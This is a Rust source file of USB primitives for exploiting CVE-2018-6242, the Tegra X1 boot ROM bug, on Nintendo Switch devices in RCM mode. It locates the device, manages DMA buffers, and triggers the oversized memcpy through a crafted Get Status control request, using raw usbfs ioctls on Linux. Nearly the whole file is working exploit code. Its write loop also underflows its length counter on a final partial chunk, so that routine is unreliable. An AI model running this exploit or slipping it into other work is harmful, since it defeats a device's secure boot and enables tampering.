//! USB primitives for abusing CVE-2018-6242 on Tegra-based devices.

use std::{cmp::min, time::Duration};

#[cfg(target_os = "linux")]
use nix::{fcntl, sys::stat::Mode, unistd::close};

use rusb::*;

#[allow(dead_code)]
#[cfg(target_os = "linux")]
mod types {
    // Include the usbdevice_fs.h FFI bindings.
    include!(concat!(env!("OUT_DIR"), "/bindings.rs"));
}

use super::PAYLOAD_START_ADDR;

/// Default Nintendo Switch Product ID for RCM mode.
const RCM_PID: u16 = 0x7321;
/// Default Nintendo Switch Vendor ID for RCM mode.
const RCM_VID: u16 = 0x0955;

/// Start address of the low DMA buffer in RCM mode.
const DMA_LOW_BUFFER_ADDRESS: u32 = 0x4000_5000;
/// Start address of the high DMA buffer in RCM mode.
const DMA_HIGH_BUFFER_ADDRESS: u32 = 0x4000_9000;

#[allow(unused)]
#[cfg(target_os = "linux")]
mod usbdevfs {
    use std::ffi;
    use std::mem::forget;
    use std::os::unix::io::RawFd;

    use bytes::BufMut;

    use super::types::*;

    ioctl_read!(usbdevfs_submiturb, 'U', 10, usbdevfs_urb);

    pub enum TransferDirection {
        HostToDevice,
        DeviceToHost,
    }

    pub enum RequestType {
        Standard,
        Class,
        Vendor,
        Reserved,
    }

    pub enum Recipient {
        Device,
        Interface,
        Endpoint,
        Other,
        Reserved(u8),
    }

    pub struct ControlRequest {
        pub direction: TransferDirection,
        pub request_type: RequestType,
        pub recipient: Recipient,
        pub request: u8,
        pub value: u16,
        pub index: u16,
        pub data: Vec<u8>,
    }

    impl ControlRequest {
        pub fn write_request(&self, data: &mut Vec<u8>) {
            let direction = match self.direction {
                TransferDirection::HostToDevice => 0b00000000,
                TransferDirection::DeviceToHost => 0b10000000,
            };
            let request_type = match self.request_type {
                RequestType::Standard => 0b00000000,
                RequestType::Class => 0b00100000,
                RequestType::Vendor => 0b01000000,
                RequestType::Reserved => 0b01100000,
            };
            let recipient = match self.recipient {
                Recipient::Device => 0b00000000,
                Recipient::Interface => 0b00000001,
                Recipient::Endpoint => 0b00000010,
                Recipient::Other => 0b00000011,
                Recipient::Reserved(v) => v,
            };

            data.put_u8(direction + request_type + recipient);
            data.put_u8(self.request);
            data.put_u16_le(self.value);
            data.put_u16_le(self.index);
            data.put_u16_le(self.data.len() as u16);
        }
    }

    fn create_urb(id: usize, mut data: Vec<u8>) -> Box<usbdevfs_urb> {
        let urb = usbdevfs_urb {
            type_: USBDEVFS_URB_TYPE_CONTROL,
            endpoint: 0,
            status: 0,
            flags: 0,
            buffer: data.as_mut_ptr() as *mut ffi::c_void,
            buffer_length: data.len() as i32,
            actual_length: 0,
            start_frame: 0,
            __bindgen_anon_1: usbdevfs_urb__bindgen_ty_1 {
                number_of_packets: 0,
            },
            error_count: 0,
            signr: 0,
            usercontext: id as *mut ffi::c_void,
            iso_frame_desc: __IncompleteArrayField::new(),
        };

        forget(data);

        Box::new(urb)
    }

    pub unsafe fn submit_urb(fd: RawFd, request: &ControlRequest) {
        // Prepare the request buffer.
        let mut data = Vec::with_capacity(request.data.len() + 8);
        request.write_request(&mut data);

        // Create the URB.
        let urb = create_urb(0x1337, data);

        usbdevfs_submiturb(fd, Box::into_raw(urb)).unwrap();
    }
}

/// An abstraction of the Tegra X1 RCM mode.
pub struct Rcm {
    /// The underlying USB handle to the Nintendo Switch in RCM mode.
    device: DeviceHandle<GlobalContext>,
    /// A boolean indicating whether the current DMA buffer is high.
    is_dma_buffer_high: bool,
}

impl Rcm {
    /// Creates a new instance of the RCM mode abstraction.
    pub fn new(device: DeviceHandle<GlobalContext>) -> Self {
        Rcm {
            device,
            is_dma_buffer_high: false,
        }
    }

    /// Returns the underlying device information used for this DeviceHandle.
    pub fn get_device(&self) -> Device<GlobalContext> {
        self.device.device()
    }

    /// Gets the address of the currently active DMA buffer.
    #[inline(always)]
    fn get_dma_address(&self) -> u32 {
        if self.is_dma_buffer_high {
            DMA_HIGH_BUFFER_ADDRESS
        } else {
            DMA_LOW_BUFFER_ADDRESS
        }
    }

    /// Reads data from RCM over USB into the given buffer.
    ///
    /// The returned result is the number of bytes read in
    /// case of `Ok(n)`, otherwise the error caused by USB.
    pub fn read(&self, buffer: &mut [u8]) -> Result<usize> {
        // Perform the read over USB.
        self.device
            .read_bulk(0x81, buffer, Duration::from_millis(1000))
    }

    pub fn write(&mut self, mut buffer: &[u8]) -> Result<usize> {
        let mut data_length = buffer.len();
        let mut written_bytes = 0;
        let packet_size = 0x1000;

        while data_length > 0 {
            // Determine the size of the chunk.
            let chunk_size = min(data_length, packet_size);
            data_length -= packet_size;

            // Prepare the chunk and update the reamining data.
            let chunk = &buffer[..chunk_size];
            buffer = &buffer[chunk_size..];

            // Swap the DMA buffers and perform the write over USB.
            self.swap_dma_buffers();
            match self
                .device
                .write_bulk(0x01, chunk, Duration::from_millis(5000))
            {
                Ok(n) => written_bytes += n,
                Err(err) => return Err(err),
            };
        }

        Ok(written_bytes)
    }

    /// Swaps out the DMA buffers.
    ///
    /// NOTE: This method should always be called when USB writes are issued.
    #[inline(always)]
    fn swap_dma_buffers(&mut self) {
        self.is_dma_buffer_high = !self.is_dma_buffer_high;
    }

    /// Swaps out the DMA buffers.
    ///
    /// NOTE: For the CVE-2018-6242 exploit, usage of the high
    /// buffer effectively reduces the amount of writes necessary.
    pub fn switch_dma_buffer(&mut self, high: bool) -> Result<()> {
        if self.is_dma_buffer_high != high {
            self.write(&[0x00; 0x1000])?;
            self.swap_dma_buffers();
        }

        Ok(())
    }

    /// Reads the Device ID from RCM over USB.
    pub fn read_device_id(&self) -> Option<[u8; 0x10]> {
        let mut device_id = [0; 0x10];

        match self.read(&mut device_id) {
            Ok(bytes) => {
                if bytes != 0x10 {
                    return None;
                }
            }
            Err(_) => return None,
        };

        Some(device_id)
    }

    /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
    ///
    /// The returned result is the number of bytes read in case of `Ok(n)`,
    /// otherwise the error caused by USB.
    #[cfg(target_os = "macos")]
    pub fn memecpy(&self) -> Result<usize> {
        // Prepare the buffer for the control request.
        let length = PAYLOAD_START_ADDR - self.get_dma_address();
        let buffer = vec![0; length];

        // Issue a Get Status control request with an Endpoint recipient which causes the
        // which causes the size of the data to copy into the DMA buffer to be set to the
        // size of the bytes requested by us.
        self.device
            .read_control(0x82, 0x00, 0, 0, &mut buffer, Duration::from_millis(1000))
    }

    /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
    ///
    /// The returned result is the number of bytes read in case of `Ok(n)`,
    /// otherwise the error caused by USB.
    #[cfg(target_os = "windows")]
    pub fn memecpy(&self) -> Result<usize> {
        todo!()
    }

    /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
    ///
    /// NOTE: Since libusb on Linux does not allow us to blow up pages, we need
    /// to use the raw usbfs file descriptor to trigger the vulnerability.
    ///
    /// The returned result is the number of bytes read in case of `Ok(n)`,
    /// otherwise the error caused by USB.
    #[cfg(target_os = "linux")]
    pub fn memecpy(&self) -> Result<usize> {
        // Calculate the length of data to request to trigger the exploit.
        let length = (PAYLOAD_START_ADDR - self.get_dma_address()) as u16;

        // Prepare the path to the USB device to access.
        let device = self.device.device();
        let usbfs = format!(
            "/dev/bus/usb/{:0>3}/{:0>3}",
            device.bus_number(),
            device.address()
        );

        // Open the usbfs file descriptor.
        let fd = fcntl::open(usbfs.as_str(), fcntl::OFlag::O_RDWR, Mode::all()).unwrap();

        // Craft the Get Status request to send over USB.
        let request = usbdevfs::ControlRequest {
            direction: usbdevfs::TransferDirection::HostToDevice,
            request_type: usbdevfs::RequestType::Standard,
            recipient: usbdevfs::Recipient::Endpoint,
            request: 0x0, // Get Status
            value: 0,
            index: 0,
            data: vec![0; length as usize],
        };

        // Do the ioctl magic.
        unsafe { usbdevfs::submit_urb(fd, &request) };

        // Close the usbfs file descriptor.
        close(fd).unwrap();

        // Simulate the behavior of other memecpys.
        Err(Error::Io)
    }
}

/// Attempts to find a Nintendo Switch device in RCM mode and opens a handle to it.
pub fn get_rcm_device(vid: Option<u16>, pid: Option<u16>) -> Result<DeviceHandle<GlobalContext>> {
    let actual_vid = vid.unwrap_or(RCM_VID);
    let actual_pid = pid.unwrap_or(RCM_PID);

    let device_list = DeviceList::new()?;

    for device in device_list.iter() {
        let descriptor = device.device_descriptor()?;

        if descriptor.product_id() == actual_pid && descriptor.vendor_id() == actual_vid {
            let device_handle = device.open()?;
            return Ok(device_handle);
        }
    }

    Err(Error::NoDevice)
}
